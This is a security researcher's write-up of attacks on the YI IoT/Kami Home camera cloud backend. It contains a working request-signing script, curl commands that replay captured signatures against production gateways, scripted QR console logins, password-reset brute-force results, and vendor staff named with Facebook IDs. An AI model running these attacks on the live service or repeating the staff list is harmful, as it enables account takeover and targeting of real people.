---
title: "Hacking a Cloud IP Camera, Part 2: The Cloud Phase Hacking the YI IoT / Kami Home Backend"
date: 2026-09-07
draft: false
tags: ["cloud-security", "api-security", "iot-security", "yi-iot", "kami-home", "account-takeover"]
---

![Hacking a Cloud IP Camera Part 2 The Cloud Phase](header.jpeg)

## Table of Contents
1. [Introduction](#introduction)
2. [Setup and Ground Rules](#setup-and-ground-rules)
3. [Cracking the Request Signature](#cracking-the-request-signature)
4. [The Replay Chain: One URL, Permanent Account Takeover](#the-replay-chain--one-url--permanent-account-takeover)
5. [Pre-Auth Oracles: Who Has an Account Here?](#pre-auth-oracles--who-has-an-account-here)
6. [The Password Reset Pipeline: No Brakes, Tiny Keyspace](#the-password-reset-pipeline--no-brakes--tiny-keyspace)
7. [The Test Gateway That Serves Production](#the-test-gateway-that-serves-production)
8. [QR Login Without a Phone: Console Sessions from Pure API](#qr-login-without-a-phone--console-sessions-from-pure-api)
9. [Cross-Account Attacks: Where the Defenses Actually Held](#cross-account-attacks--where-the-defenses-actually-held)
10. [The Facebook Secret: Enumerating the Vendor's Own Team](#the-facebook-secret--enumerating-the-vendors-own-team)
11. [The Information-Leak Sweep](#the-information-leak-sweep)
12. [What Didn't Work](#what-didnt-work)
13. [Findings Summary](#findings-summary)
14. [Closing Thoughts](#closing-thoughts)

## Introduction

Part 1 ended with a promise: the app hands out device secrets and reusable signatures but does the *cloud* actually authorize anything, or are all those object identifiers just waiting for someone to ask for another user's data? This post is the answer. Same camera, same two test accounts (A: `userid 16166865`, B: `userid 16194022`), but now the target is the entire backend: five regional API gateways, the pre-production environment, the Kami web console backend, and every third-party integration the app drags along.

The short version: **the authorization layer is genuinely good** and the authentication layer is genuinely not. Every cross-account attack I threw at it was rejected. But the platform undermines its own authorization with signatures that never expire, tokens that never rotate, credentials in URLs, a password-reset pipeline with no rate limiting and a 4-character code space, a test gateway serving production data over cleartext HTTP, and a Facebook app secret that enumerates the vendor's own developer team. The headline result: **a single captured API URL the kind sitting in every load balancer and WAF log is a permanent account takeover**, demonstrated end-to-end from a different continent.

All scripts referenced below are in the companion repository:

> **PoC repository:** `https://github.com/mikias1943/yi-exploit-scripts/`

## Setup and Ground Rules

- **Accounts:** two tester-owned accounts. Account A (`16166865`, `xigac57080@archifun.com`) owns the camera. Account B (`16194022`, `hafad57631@fanzher.com`) is the attacker account for cross-account tests.
- **Device:** the same YI/Kami camera (UID `TNPXGAR-583857-XXXXX`, DID `A1769004XXXXXXXXXXXX`, model A1769).
- **Evidence base:** the 523 Burp requests from Part 1, the decompiled app, 46 console API routes extracted from the production web-console JavaScript bundles, plus ~30 batches of scripted live tests executed from Kali and an independent second host (to prove replay works cross-network).

## Cracking the Request Signature

Everything in this phase depends on being able to sign requests like the app does without a signing oracle, every server response is ambiguous ("was that rejected because of authorization, or because my signature was wrong?"). Part 1 established the base scheme: `hmac = Base64(HMAC-SHA1(key = token + "&" + token_secret, msg = params))`. What the live testing revealed is that **there is no single canonicalization rule different endpoint families sign differently**, and you only find out by fuzzing:

```python
# yi_sign.py the standalone signer used for every authenticated test
import hmac, hashlib, base64, urllib.parse

def sign(params: dict, token: str, secret: str, mode: str = "sorted") -> str:
    if mode == "sorted":          # /v4/users/prop, /v4/devices/list, ...
        items = sorted((k, v) for k, v in params.items() if v != "")
    else:                         # "insertion": /v2/alert/list, QR approve, ...
        items = list(params.items())          # client order, empties INCLUDED
    msg = "&".join(f"{k}={v}" for k, v in items)
    key = (token + "&" + secret).encode()
    return base64.b64encode(hmac.new(key, msg.encode(), hashlib.sha1).digest()).decode()
```

Verification against captured traffic, byte-for-byte:

```
# sorted mode, capture: GET /orderpay/v8/stripe/pay/key
computed : xVgIZ5qMTac0w8VgkaR8rDvPXXo=
captured : xVgIZ5qMTac0w8VgkaR8rDvPXXo=        # exact match

# insertion mode, capture: /v5/devices/firmware_branch (user_id,seq,firm_version)
computed : vflYFmoPxahuaF21oT2Wds5hKpw=
captured : vflYFmoPxahuaF21oT2Wds5hKpw=        # exact match
```

The per-family behavior, mapped by live fuzzing (sorted vs. insertion, empties stripped vs. included each wrong combination answered `20202` until the right one answered `20000`):

| Family | Canonicalization |
|---|---|
| `/v4/users/prop`, `/v4/devices/list`, `/v4/users/extinfo`, `/v5/deviceshare/*`, `/v8/usershare/*`, `/vas/v8/alert/deviceList` | sorted, empty values stripped |
| `/v2/devices/edit`, `/v2/alert/list` (`seq,userid,type,sub_type,from,to,limit,fromDB,expires`), `/v5/devices/password`, `/v5/users/loginInfos/search`, `/v5/devices/model/list` | insertion order, empties included |
| QR approve `PUT /v4/users/auth_token` | insertion: `seq,userid,token` cracked by fuzzing, valid on test **and** prod |
| `/v5/devices/firmware_branch` | insertion: `user_id,seq,firm_version` |

One more quirk worth documenting: the verifier **silently ignores unknown parameters** appending `foo=bar` to a signed request does not invalidate it, which makes tampering experiments cheaper for an attacker.

With the signer working, Account B's credentials (`token 3b48ba3b...`, `token_secret 1ff46d79...`) became a full signing oracle for the rest of the engagement.

## The Replay Chain: One URL, Permanent Account Takeover

This is the finding the whole phase was building toward, and it's four verified properties stacked on top of each other.

**Property 1 credentials live in URLs.** Login is a `GET` with the password blob in the query string; every authenticated request carries `hmac`, `userid`, sometimes `token` in the URL. Anything that logs URLs (LBs, WAFs, APM, corporate proxies, browser history) logs credentials.

**Property 2  signatures never expire, and work from anywhere.** Account A's signature `TCTO/AjATLvMkdYpXznM0sBX/Uc=` (over just `userid=16166865&seq=1`) was captured on 2026-08-31. On 2026-09-05/06 five to six days later from a **different machine, different IP, different continent, zero cookies**:

```bash
curl -s "https://plt-gw-us.xiaoyi.com/v4/users/prop?hmac=TCTO/AjATLvMkdYpXznM0sBX/Uc=&userid=16166865&seq=1"
```

```json
{"code":"20000","data":{"userid":"16166865","account":"xigac57080@archifun.com",
 "email":"xigac57080@archifun.com","mobile":"","openId":"a251d86cfdf41bfb633becb3f95...",
 ...ad/AI/personalization flags...}}
```

```bash
curl -s "https://plt-gw-us.xiaoyi.com/v4/users/extinfo?hmac=TCTO/AjATLvMkdYpXznM0sBX/Uc=&userid=16166865&seq=1"
# -> {"code":"20000", ... "timeZone":"Asia/Shanghai","language":"en-US","location":"USA"}
```

The server does not check timestamp freshness. There is no nonce.

**Property 3 replay isn't read-only.** A second captured signature (over `userid,seq,timestamp`) replayed against `/v2/qrcode/get_bindkey` days after capture minted a **fresh device bindkey**:

```bash
curl -s "https://plt-gw-us.xiaoyi.com/v2/qrcode/get_bindkey?hmac=vT+gLOS4uIxWxRD/yY/rRQ6+Ej4=&userid=16166865&seq=1&timestamp=1788165786994"
# -> {"code":"20000","data":{"bindkey":"USpkXRO7gdIV2b5F", ...}}
```

That's a security-sensitive, state-changing operation executed with a days-old logged URL.

**Property 4 tokens are static.** Every login of Account B different days, different IPs, app and scripted clients returned the **identical** `token`/`token_secret` pair, and a session rebuilt from nothing but B's old login-URL parameters worked fully from an unrelated host. No rotation, no expiry, no device binding, no visible invalidation.

**The chain, stated plainly:** any logged URL from a user's session yields either a password-equivalent blob or a signature that (a) never expires, (b) replays from any network, (c) works across endpoints (Part 1 showed one signature accepted on six+ endpoints), and (d) pairs with a token model that never changes. I demonstrated the realistic version: a 5-day-old captured URL, replayed from another continent, returning the account's PII and minting fresh device bindkeys. No user-visible indication, ever.

## Pre-Auth Oracles: Who Has an Account Here?

Before you attack an account you need to know it exists. The platform answers that question for free, pre-authentication, on **three independent endpoints**, uniformly across all five regional gateways and the console backend. Positive and negative controls with my own accounts:

```bash
# Oracle 1: checkEmail pre-auth
curl -s "https://plt-gw-us.xiaoyi.com/v4/users/checkEmail?email=xigac57080@archifun.com"   # A (exists)
# -> {"code":"20254"}     # account EXISTS
curl -s "https://plt-gw-us.xiaoyi.com/v4/users/checkEmail?email=definitely-not-real-9z7x@example.com"
# -> {"code":"20253"}     # does not exist

# Oracle 2: login error differential — pre-auth
# existing account, wrong password -> {"code":"20261"}  (wrong password)
# unknown account                  -> {"code":"20253"}  (no such account)

# Oracle 3: resend_activation_code pre-auth PUT
curl -s -X PUT "https://plt-gw-us.xiaoyi.com/v4/users/resend_activation_code?email=<addr>"
# existing -> 20000/40110 ; nonexistent -> 20253
```

## The Password Reset Pipeline: No Brakes, Tiny Keyspace

This is the finding I rate most dangerous after the replay chain. Assemble it piece by piece every piece individually observed:

**Piece 1: the code-minting endpoint is pre-auth and unlimited.**

```bash
curl -s "https://plt-gw-us.xiaoyi.com/v4/users/validation_code_id"
# -> {"code":"20000","data":{"validationCodeId":"<32-hex>"}}   # no auth, no params, no hmac, no limit
```

**Piece 2: the codes are 4 characters.** From genuine app captures of the validation-code system (`client_code` on the register flow): `X34V`, `HYRH` **uppercase alphanumeric, 4 chars**. That's 36⁴ = 1,679,616 candidates (457k if letters-only). Wrong codes get a distinct answer (`40120` register / `20260` reset) and nothing locks.

**Piece 3: reset attempts are completely unthrottled.** A controlled burst of **500 consecutive wrong-code attempts** against `PUT /v4/users/reset_pwd` from a single source IP in a single session:

```
reset_pwd burst: 500/500 uniform 20260
latency: min 0.74s  median 1.00s  max 3.35s
first-100 avg 1.39s  vs  last-100 avg 1.13s     <- no progressive slowdown at all
lockout/captcha/escalation: none observed
```

**Piece 4: sending codes is unthrottled too.**

```
PUT /v4/users/h5_reset_pwd            -> 5/5  {"code":"20000"}   (pre-auth reset-email sends)
GET /v4/users/email/verify_code       -> 10/10 {"code":"20000"}   (authenticated, arbitrary recipient)
```

No cooldown, no CAPTCHA, either path. (Which is also an email-bombing primitive: any low-privilege session can make the vendor's own mail infrastructure spam arbitrary addresses — and since `20000` is returned even when the domain is silently dropped, sender-side detection is blind.)

**Piece 5: targeting is pre-auth** (the oracles above).

**The honest status of the chain:** every server-side component is proven unlimited code minting, 4-char keyspace, uniform wrong-code oracle, zero throttling at 500-attempt scale, unthrottled sending. At the observed ~1 req/s sustained single-host rate the full keyspace falls in ~19 days; from a modest botnet, hours and **no lockout ever triggers**. What I did *not* do: complete a real reset with a guessed code.

## The Test Gateway That Serves Production

`test-api-us.xiaoyi.com` (Tomcat 8.5.37, a 2018 build) is supposed to be pre-production. It accepts **production credentials** and returns **production data**:

```bash
# Account A's PRODUCTION profile, served by the TEST gateway, over HTTP:
curl -s "http://test-api-us.xiaoyi.com/v4/users/prop?hmac=<replayed A sig>&userid=16166865&seq=1"
# -> {"code":"20000", ...same user record as prod...}

# Byte-identical model data on test vs prod, signed with prod creds:
curl -s "https://plt-gw-us.xiaoyi.com/v5/devices/model/list?..."   -> {"code":"20000", ...}
curl -s "http://test-api-us.xiaoyi.com/v5/devices/model/list?..."  -> {"code":"20000", ...identical...}
```

Confirmed on three endpoint families. And note the scheme: `http://`. Production tokens and signatures transiting that host are cleartext on the wire. Test infrastructure is patched slower and monitored less; here it is a production-data replica with a 2018 application server, reachable over an interceptable channel. (Ghostcat/CVE-2020-1938 is in range for 8.5.37 checked; AJP 8009 is externally filtered, currently mitigating. Version disclosure via default error pages on every gateway: prod Tomcat 9.0.40, test 8.5.37, `gw-test` 8.5.85.)

## QR Login Without a Phone: Console Sessions from Pure API

The Kami web console offers "scan this QR code with your app to log in." The flow's design assumption is that approval requires holding the logged-in phone. It doesn't. With only account credentials, the entire flow is scriptable no phone, no camera, no QR image:

```bash
# 1. Mint a QR login token PRE-AUTH (works on test AND prod console):
curl -s "https://kamicloud-api.kamihome.com/v4/users/auth_token?newPcQrCode=true"
# -> {"code":"20000","data":{"token":"QR..."}}

# 2. Approve it as Account A signature over INSERTION order (seq,userid,token),
#    found by live fuzzing after sorted-order attempts returned 20202:
curl -s -X PUT "https://plt-gw-us.xiaoyi.com/v4/users/auth_token?seq=1&userid=16166865&token=QR...&hmac=<sig(seq,userid,token)>"
# -> {"code":"20000"}    # web login approved

# 3. Exchange for a console session:
curl -s "https://kamicloud-api.kamihome.com/v4/users/check_auth_token?token=QR...&region=us&timeZoneCountry=US"
# -> {"code":"20000", ...FULL PROFILE JSON...}
#    Set-Cookie: pc-cloud=s%3A...   (Express signed session cookie)
```

And the first walled call with that cookie:

```bash
curl -s -H "Cookie: pc-cloud=s%3A..." "https://kamicloud-api.kamihome.com/v8/cloud/deviceList?seq=1"
# -> {"code":"20000", ...Account A's device record (eiName/eiNumber/eiInterBy)...}
```

A fully authenticated **production console session**, minted purely over the API, against both the test and production console backends. No binding between the approval and any physical device, no push confirmation, no user-facing "a web session was approved from IP X" notice. Combined with any credential-exposure finding in this report, console access (which exposes things the mobile API doesn't e.g. `createToken` order tokens, a more verbose `pair/status`) follows silently.

## The Facebook Secret: Enumerating the Vendor's Own Team

Part 1 noted the hardcoded Facebook app secret in `ShareSDK.xml`. In this phase I exercised it (from Google Cloud Shell, since Facebook's Graph API was unreachable from the Kali network). The secret is live and operates as the "YI Home" application. What it returns:

```bash
curl -s "https://graph.facebook.com/v19.0/1575139842724297/roles?access_token=1575139842724297|ac6fb2cd..."
```

```json
{"data":[
  {"user":"118255871846921","role":"administrators"},     # "Xiaoyi App"
  {"user":"1402270380084440","role":"administrators"},    # 宋炀 (Song Yang)
  {"user":"1377067054565021","role":"administrators"},    # "Devops Kami"
  {"user":"4195498083842991","role":"developers"},        # Khetaram Kumawat
  {"user":"10157176867464651","role":"developers"},       # Sagi Golan
  {"user":"10219016732024161","role":"developers"},       # Dina Humairo
  {"user":"462931864495797","role":"developers"},         # Junyou David
  {"user":"249886589044937","role":"insights"},           # Kash Yi
  ...]}
```

The **vendor's own developer/admin team, by name and Facebook ID** a ready-made spear-phishing target list plus:

```bash
curl -s "https://graph.facebook.com/v19.0/1575139842724297/accounts/test-users?access_token=..."
# -> 8 test users, 7 with LIVE user access tokens (EAAW...), re-mintable on demand
```

Anyone with the APK has this. (A second YI FB app, `107704292745179`, is dead "API access deactivated." The WeChat secret mints tokens with no IP whitelist; its platform permissions are limited, as noted above.)

## The Information-Leak Sweep

A sweep of everything the platform exposes without (or with minimal) authentication. Each item individually minor; together they hand an attacker the internal map:

**Production JS bundle leaks the build pipeline.** The console's `main.*.js` (test + prod) embeds Jenkins internals and third-party keys:

```
NX_WORKSPACE_ROOT=/var/lib/jenkins/workspace/test-kamicloud
NX_ENV=dev  NX_VERBOSE_LOGGING=true
reCAPTCHA site key: 6Lc9Pz4eAAAAAHFXXXXXXXXXXXXX
Google OAuth clientId: 903608373634-...
Stripe TEST publishable key: pk_test_...
```

**API documentation surfaces on production.** Springfox Swagger UI shells answer 200 on `test-api-us`, `plt-gw-us`, **and** `plt-gw-eu` (`/swagger-ui.html`), though the spec endpoints (`/v2/api-docs`, `/swagger-resources`) correctly 404 statics shipped, controller disabled. The staging QA service `iot-qa-agent.stg.kamicloud.net` (FastAPI) is worse: `/docs`, `/redoc`, and `/openapi.json` fully public, schema advertising a `/admin` tree (list/search/export)  admin routes themselves currently 404.

**Verbose framework errors.** `GET /yiweb/products?channel=abc` on the console proxy:

```
HTTP 500 java.lang.NumberFormatException: For input string: ... (java.lang.Integer channel)
Server: nginx/1.20.1
```

confirming the Express proxy fronts a Java Spring backend, version banner included. Unknown console routes leak Express "Cannot GET/POST". The unsigned legacy device-management endpoints (`/vmanager/ipc/firmware/upgrade/app`, `/vmanager/upgrade` no HMAC at all) leak Spring parameter-validation internals; both currently answer `needUpdate:false` for my device (the OTA API only serves upgrades, never the current binary remote firmware acquisition for model A1769 was exhausted: no mirror, `www2.yitechnology.com` firmware portal 502).

**Abandoned and dangling assets.**

```bash
echo | openssl s_client -connect chatwook.xiaoyi.com:443 2>/dev/null | openssl x509 -noout -dates
# notAfter=Aug 14 2024 ...   # expired 2+ years abandoned Chatwoot support-chat, presumably unpatched
# (open registration is disabled; config leaks dev-default hostURL http://0.0.0.0:3000)

curl -s -X POST "https://kamicloud-api.kamihome.com/yiweb/zendesk/ticket" ...
# -> Zendesk: "No help desk ... this address is available and you can claim it"
#    yitechnology.zendesk.com = DANGLING, claimable

curl -sI "https://yi-home-tutorials.s3.amazonaws.com/"   # -> NoSuchBucket  (referenced by prod app config)
curl -sI "https://kamivision.s3.wasabisys.com/"          # -> NoSuchBucket
curl -sI "https://kamicare.s3.wasabisys.com/"            # -> NoSuchBucket
```

Claiming `yi-home-tutorials` would let an attacker serve content into the production app's tutorial WebViews. I did not claim anything (read-only ROE); the dangling references are verified. Other small items: permissive `Access-Control-Allow-Origin: *` on authenticated API responses; `iplocation.kamihome.com/ipinfo` and `iplocation.yitechnology.com/city` as free pre-auth geo oracles (low value); registration CAPTCHA is a 4-char uppercase image with simple line noise (`RW93`, `DBXU`, `FS96`...) I scripted registration end-to-end with no human in the loop and minted accounts in seconds (`20000`); a `40110` new-account login gate blunts immediate abuse but not stockpiling. And the mail pipeline quirk worth its own line: verification emails to blocked disposable domains return `20000` while nothing is dispatched success ≠ delivery, which poisons both abuse detection and support workflows.

## Findings Summary

| ID | Finding | Severity |
|---|---|---|
| C-01 | Replay chain: credentials in URLs + signatures never expire, not endpoint/IP/device-bound + static tokens **permanent account takeover from a single logged URL** (demonstrated cross-continent, incl. minting fresh device bindkeys) | **Critical** |
| C-02 | Password-reset pipeline: pre-auth unlimited code minting, 4-char code space (captures: `X34V`, `HYRH`), 500/500 attempts with zero throttling/lockout, unthrottled code sending, pre-auth targeting oracles | **High** |
| C-03 | `test-api-us.xiaoyi.com` serves **production** user data to production credentials over **cleartext HTTP**; Tomcat 8.5.37 | **High** |
| C-04 | Hardcoded Facebook app secret (live): vendor dev/admin team enumerated by name; 8 test users, 7 live tokens mintable | **High** |
| C-05 | Login password = deterministic unsalted HMAC with hardcoded key password-equivalent, rainbow-table-able (identical blobs across accounts) | Medium |
| C-06 | No rate limiting/lockout on login | Medium |
| C-07 | Pre-auth account-existence oracles on 3 endpoints (`checkEmail`, login, `resend_activation_code`), all 5 gateways | Medium |
| C-08 | QR console login fully automatable via API no device, no scan, no user notice (prod session minted in 3 calls) | Medium |
| C-09 | Third-party secrets hardcoded in app (WeChat/Weibo/QQ/Twitter/Kakao/Pangle/Google Maps ×7 paid APIs/Firebase) | Medium |
| C-10 | API serves device P2P credentials (`/v4/tnp/device_info`, `/v5/devices/password`) | Medium |
| C-11 | Unthrottled verification-email sending email-bombing via vendor infrastructure | Low |
| C-12 | Registration CAPTCHA machine-trivial; fully automated account creation demonstrated | Low |
| C-13 | Dangling buckets (`yi-home-tutorials`, `kamivision`, `kamicare`) referenced by prod app; dangling `yitechnology.zendesk.com` | Low |
| C-14 | Jenkins CI internals + reCAPTCHA/Stripe/Google keys leaked in production console JS | Low |
| C-15 | Swagger UI shells on prod US/EU gateways; public FastAPI `/docs` + `/admin` schema on staging QA agent | Low |
| C-16 | Version disclosure (Tomcat 9.0.40/8.5.37/8.5.85, nginx/1.20.1); verbose Spring/Express errors | Low |
| C-17 | `Access-Control-Allow-Origin: *` on authenticated endpoints | Low |
| C-18 | Abandoned Chatwoot (`chatwook.xiaoyi.com`), cert expired 2024-08-14 | Low |
| C-19 | Unsigned legacy `/vmanager/*` OTA endpoints | Low |
| C-20 | Mail pipeline returns success while silently dropping blocked domains | Informational |
| — | **Held:** 71-case cross-account IDOR matrix, device-bind takeover (incl. replayed bindkey), uniform anti-enumeration, social-login token verification, locked buckets/Firebase, actuator ACL, Ghostcat mitigated, WAF on `gw-test` | Positive |
